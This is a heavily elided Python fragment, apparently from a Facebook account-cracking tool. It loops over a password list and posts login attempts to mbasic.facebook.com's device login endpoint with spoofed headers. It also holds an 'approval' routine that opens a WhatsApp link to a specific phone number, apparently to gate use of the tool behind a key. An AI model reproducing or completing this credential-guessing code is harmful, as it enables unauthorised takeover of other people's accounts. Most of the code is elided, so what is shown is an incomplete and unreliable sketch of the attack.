    ...
    try:
        for ps in pwx:
            ...
            header_freefb = {'authority': 'mbasic.facebook.com',
                             ...
                             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com//login/device-based/login/async/?refsrc', data=log_data,
...
def approval():
    ...
    try:
        ...
        if id in httpCaht:
            ...
            os.system('am start https://wa.me/+923494462675?text=' + tks), approval()
            time.sleep(1)
            approval()
    except:
        sys.exit()
